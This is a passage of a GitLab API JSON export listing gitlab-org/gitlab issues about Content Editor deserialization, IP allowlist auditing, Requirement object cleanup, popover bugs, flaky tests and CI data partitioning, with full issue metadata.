AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359016","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359016","notes":"https://gitlab.com/api/v4/projects/278964/issues/359016/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359016/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359016","relative":"#359016","full":"gitlab-org/gitlab#359016"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7720,"epic":{"id":469003,"iid":7720,"title":"Deserialize GLFM on the frontend","url":"/groups/gitlab-org/-/epics/7720","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":106607645,"iid":359015,"project_id":278964,"title":"Deserialize tables on the FE","description":"Support GFM tables deserialization in the Content Editorâ€™s remark-based deserializer","state":"closed","created_at":"2022-04-13T21:06:47.709Z","updated_at":"2022-06-21T12:02:14.038Z","closed_at":"2022-06-08T18:10:52.883Z","closed_by":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"labels":["Content Editor","Deliverable","GitLab Free","devops::create","feature::enhancement","group::editor","section::dev","type::feature","workflow::in dev"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"}],"author":{"id":5212466,"username":"ericschurter","name":"Eric Schurter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5212466/avatar.png","web_url":"https://gitlab.com/ericschurter"},"type":"ISSUE","assignee":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359015","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359015","notes":"https://gitlab.com/api/v4/projects/278964/issues/359015/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359015/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359015","relative":"#359015","full":"gitlab-org/gitlab#359015"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7720,"epic":{"id":469003,"iid":7720,"title":"Deserialize GLFM on the frontend","url":"/groups/gitlab-org/-/epics/7720","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":106607634,"iid":359014,"project_id":278964,"title":"Deserialize footnotes on the FE","description":"Support GFM footnotes deserialization in the Content Editorâ€™s remark-based deserializer","state":"closed","created_at":"2022-04-13T21:06:36.411Z","updated_at":"2022-06-21T12:02:14.110Z","closed_at":"2022-06-15T15:51:28.908Z","closed_by":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"labels":["Content Editor","Deliverable","GitLab Free","devops::create","feature::enhancement","group::editor","section::dev","type::feature","workflow::in dev"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"}],"author":{"id":5212466,"username":"ericschurter","name":"Eric Schurter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5212466/avatar.png","web_url":"https://gitlab.com/ericschurter"},"type":"ISSUE","assignee":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359014","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359014","notes":"https://gitlab.com/api/v4/projects/278964/issues/359014/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359014/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359014","relative":"#359014","full":"gitlab-org/gitlab#359014"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7720,"epic":{"id":469003,"iid":7720,"title":"Deserialize GLFM on the frontend","url":"/groups/gitlab-org/-/epics/7720","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":106607623,"iid":359013,"project_id":278964,"title":"Deserialize auto links on the FE","description":"Support GFM autolinks deserialization in the Content Editorâ€™s remark-based deserializer","state":"closed","created_at":"2022-04-13T21:06:26.516Z","updated_at":"2022-06-21T12:02:14.177Z","closed_at":"2022-06-14T13:36:17.334Z","closed_by":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"labels":["Content Editor","Deliverable","GitLab Free","devops::create","feature::enhancement","group::editor","section::dev","type::feature","workflow::in dev"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"}],"author":{"id":5212466,"username":"ericschurter","name":"Eric Schurter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5212466/avatar.png","web_url":"https://gitlab.com/ericschurter"},"type":"ISSUE","assignee":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"user_notes_count":2,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359013","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359013","notes":"https://gitlab.com/api/v4/projects/278964/issues/359013/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359013/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359013","relative":"#359013","full":"gitlab-org/gitlab#359013"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7720,"epic":{"id":469003,"iid":7720,"title":"Deserialize GLFM on the frontend","url":"/groups/gitlab-org/-/epics/7720","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":106607606,"iid":359012,"project_id":278964,"title":"Deserialize embedded video and audio on the FE","description":"","state":"closed","created_at":"2022-04-13T21:06:13.124Z","updated_at":"2022-09-21T12:02:03.027Z","closed_at":"2022-09-09T12:50:14.649Z","closed_by":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"labels":["Content Editor","Deliverable","GitLab Free","backend","devops::create","feature flag","feature::enhancement","frontend","group::editor","quad-planning::complete-no-action","section::dev","type::feature","workflow::verification"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"}],"author":{"id":5212466,"username":"ericschurter","name":"Eric Schurter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5212466/avatar.png","web_url":"https://gitlab.com/ericschurter"},"type":"ISSUE","assignee":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359012","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359012","notes":"https://gitlab.com/api/v4/projects/278964/issues/359012/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359012/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359012","relative":"#359012","full":"gitlab-org/gitlab#359012"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7720,"epic":{"id":469003,"iid":7720,"title":"Deserialize GLFM on the frontend","url":"/groups/gitlab-org/-/epics/7720","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":106599394,"iid":358986,"project_id":278964,"title":"Audit Changes to IP AllowList","description":"## Problem\n\nCurrently, we do not provide API control of the IP AllowList for GitLab.com Groups: https://gitlab.com/gitlab-org/gitlab/-/issues/351493\n\nWhen a group has many IP addresses on the allow list, it becomes unwieldy to manage these via the UI, especially when multiple people could be manually editing the list at the same time...ending in errors and questions about what data was actually changed.\n\n## Proposal\n\nUntil API control of the AllowList can be added, we can add auditing to any changes in the IP AllowList:\n\n![image](/uploads/0eb688d8a064691abb7ab148a60e9382/image.png)\n\nAudit should include:\n- Value of field before audit\n- Value of field after audit \n- User who performed the change\n- date/time stamp of change\n\nThis should be implemented using the Audit Events Framework: https://docs.gitlab.com/ee/development/audit_event_guide/#audit-event-instrumentation-flows","state":"closed","created_at":"2022-04-13T17:47:55.192Z","updated_at":"2022-07-08T17:49:33.634Z","closed_at":"2022-05-11T10:28:46.103Z","closed_by":{"id":3482158,"username":"pshutsin","name":"Pavel Shutsin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3482158/avatar.png","web_url":"https://gitlab.com/pshutsin"},"labels":["Category:System Access","Deliverable","GitLab Premium","GitLab Ultimate","devops::manage","group::optimize","priority::1","release post item::in review","section::dev","type::feature","workflow::production"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":3482158,"username":"pshutsin","name":"Pavel Shutsin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3482158/avatar.png","web_url":"https://gitlab.com/pshutsin"}],"author":{"id":9425173,"username":"hsutor","name":"Hannah Sutor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9425173/avatar.png","web_url":"https://gitlab.com/hsutor"},"type":"ISSUE","assignee":{"id":3482158,"username":"pshutsin","name":"Pavel Shutsin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3482158/avatar.png","web_url":"https://gitlab.com/pshutsin"},"user_notes_count":14,"merge_requests_count":0,"upvotes":6,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358986","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358986","notes":"https://gitlab.com/api/v4/projects/278964/issues/358986/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358986/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358986","relative":"#358986","full":"gitlab-org/gitlab#358986"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106596630,"iid":358976,"project_id":278964,"title":"Ignore unused fields on Requirement Object","description":"We decided to keep old Requirement object to [act as a proxy](https://gitlab.com/gitlab-org/gitlab/-/issues/323781). \n\nIn this case we should keep only `iid`, and `issue_id` fields on `requirements` table. All fields from requirements should already be in sync and [delegated to issues](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74296).\n\nTo avoid irreparable data-loss we should only ignore these fields and not remove them completely. This will involve removing code that syncs fields on the Work Item type with the Requirement object.","state":"closed","created_at":"2022-04-13T16:42:48.202Z","updated_at":"2023-01-12T21:24:50.862Z","closed_at":"2022-10-13T14:12:44.437Z","closed_by":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"labels":["Deliverable","Next Up","backend","devops::plan","group::certify","maintenance::refactor","missed-deliverable","missed:15.0","missed:15.1","missed:15.2","section::dev","type::maintenance","workflow::verification"],"milestone":{"id":2453027,"iid":77,"group_id":9970,"title":"15.5","description":"","state":"active","created_at":"2022-02-03T22:29:56.909Z","updated_at":"2022-02-03T22:29:56.909Z","due_date":"2022-10-17","start_date":"2022-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/77"},"assignees":[{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"}],"author":{"id":4418630,"username":"johnhope","name":"John Hope","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4418630/avatar.png","web_url":"https://gitlab.com/johnhope"},"type":"ISSUE","assignee":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"user_notes_count":15,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358976","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358976","notes":"https://gitlab.com/api/v4/projects/278964/issues/358976/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358976/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358976","relative":"#358976","full":"gitlab-org/gitlab#358976"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":8032,"epic":{"id":519221,"iid":8032,"title":"Start using requirement issue (instead of requirement) internally","url":"/groups/gitlab-org/-/epics/8032","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106591447,"iid":358958,"project_id":278964,"title":"User popovers are too \"sticky\", and stay visible for longer than they should","description":"When mousing over a page, you might activate a user popover, but then it doesn't go away until you explicitly click outside of it.\n\nI don't have a reliable way to reproduce the issue yet, but here's a video demonstrating it (the \"sticky\" popover appears about 12 seconds in):\n\n![sticky_user_popover](/uploads/5b1189ea9e8e3f704c8a2ee8ade49cb4/sticky_user_popover.mp4)","state":"closed","created_at":"2022-04-13T14:56:59.312Z","updated_at":"2022-11-22T18:44:34.365Z","closed_at":"2022-05-26T11:44:42.619Z","closed_by":{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"},"labels":["Deliverable","devops::manage","frontend","group::code review","missed-deliverable","missed:14.10","missed:15.0","section::dev","type::bug"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"}],"author":{"id":553096,"username":"markrian","name":"Mark Florian","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/553096/avatar.png","web_url":"https://gitlab.com/markrian"},"type":"ISSUE","assignee":{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"},"user_notes_count":13,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358958","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358958","notes":"https://gitlab.com/api/v4/projects/278964/issues/358958/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358958/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358958","relative":"#358958","full":"gitlab-org/gitlab#358958"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106588619,"iid":358953,"project_id":278964,"title":"Fix false-positive feature tests for the MR diffs scroll to hash","description":"A follow-up on https://gitlab.com/gitlab-org/gitlab/-/issues/358788\n\nCurrent feature tests for scrolling to a line of code with anchor links are actually producing false-positive results.\n\nWhile https://gitlab.com/gitlab-org/gitlab/-/issues/358788 was broken these tests did pass.","state":"closed","created_at":"2022-04-13T14:15:10.246Z","updated_at":"2022-11-21T12:01:46.816Z","closed_at":"2022-11-15T15:17:42.992Z","closed_by":{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"},"labels":["Deliverable","devops::create","frontend","group::code review","merge requests","missed-deliverable","missed:15.1","missed:15.3","missed:15.4","missed:15.5","priority::2","quad-planning::complete-no-action","section::dev","severity::3","test","type::maintenance"],"milestone":{"id":2687593,"iid":81,"group_id":9970,"title":"15.6","description":"","state":"active","created_at":"2022-07-06T19:22:27.893Z","updated_at":"2022-07-06T19:22:27.893Z","due_date":"2022-11-17","start_date":"2022-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/81"},"assignees":[{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"}],"author":{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"},"type":"ISSUE","assignee":{"id":10539680,"username":"slashmanov","name":"Stanislav Lashmanov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10539680/avatar.png","web_url":"https://gitlab.com/slashmanov"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358953","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358953","notes":"https://gitlab.com/api/v4/projects/278964/issues/358953/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358953/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358953","relative":"#358953","full":"gitlab-org/gitlab#358953"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106586776,"iid":358943,"project_id":278964,"title":"PoC for removing partitioned data using foreign keys","description":"## Description\n\nLike in https://gitlab.com/gitlab-org/gitlab/-/issues/357384 we want to ship a PoC that will prove that we can efficiently remove resources associated with pipelines (builds, stages, artifacts) using foreign keys and `ON DELETE CASCADE` with partitioned CI/CD schema.\n\nWe want to better understand if using foreign keys with `ON DELETE CASCADE` will have to scan all partitions to perform a removal. Is it even possible to rely `ON DELETE CASCADE` with foreign keys in that case https://www.2ndquadrant.com/en/blog/postgresql-12-foreign-keys-and-partitioned-tables/?\n\n## Objectives\n\nCheck if removing resources through foreign keys actually makes it possible to scan all partitions.\n\n/cc @fabiopitino @mbobin @morefice @jheimbuck_gl","state":"closed","created_at":"2022-04-13T13:45:49.369Z","updated_at":"2023-01-10T15:52:50.625Z","closed_at":"2022-09-01T11:50:03.731Z","closed_by":{"id":263716,"username":"grzesiek","name":"Grzegorz Bizon","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/263716/avatar.jpeg","web_url":"https://gitlab.com/grzesiek"},"labels":["CI data partitioning","Verify::P2","backend","ci::scaling","devops::verify","group::pipeline execution","section::ops","type::maintenance","workflow::ready for development"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":731181,"username":"mbobin","name":"Marius Bobin","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c0a726d6aa37d780309f7b3ea3555a14?s=80\u0026d=identicon","web_url":"https://gitlab.com/mbobin"}],"author":{"id":263716,"username":"grzesiek","name":"Grzegorz Bizon","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/263716/avatar.jpeg","web_url":"https://gitlab.com/grzesiek"},"type":"ISSUE","assignee":{"id":731181,"username":"mbobin","name":"Marius Bobin","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c0a726d6aa37d780309f7b3ea3555a14?s=80\u0026d=identicon","web_url":"https://gitlab.com/mbobin"},"user_notes_count":13,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358943","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358943","notes":"https://gitlab.com/api/v4/projects/278964/issues/358943/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358943/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358943","relative":"#358943","full":"gitlab-org/gitlab#358943"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5417,"epic":{"id":206291,"iid":5417,"title":"Partition CI/CD pipelines data","url":"/groups/gitlab-org/-/epics/5417","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":106580340,"iid":358935,"project_id":278964,"title":"[Meta] Migrate 2 components to Pajamas in 15.0","description":"This is a meta issue to track the development of ~\"group::code review\" ~frontend for migrating components to Pajamas.\n\n- [ ] Issue 1 here\n- [ ] Issue 2 here","state":"closed","created_at":"2022-04-13T11:52:47.490Z","updated_at":"2022-05-24T12:00:23.015Z","closed_at":"2022-05-18T15:40:54.190Z","closed_by":{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"labels":["Deliverable","Pajamas","SUS::Non-impacting","devops::create","frontend","group::code review","pajamas::integrate","section::dev","type::maintenance"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"}],"author":{"id":853414,"username":"andr3","name":"AndrÃ© LuÃ­s","state":"active","avatar_url":"https://secure.gravatar.com/avatar/241e39726efb512a29621070ccf26a90?s=80\u0026d=identicon","web_url":"https://gitlab.com/andr3"},"type":"ISSUE","assignee":{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358935","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 2 checklist items 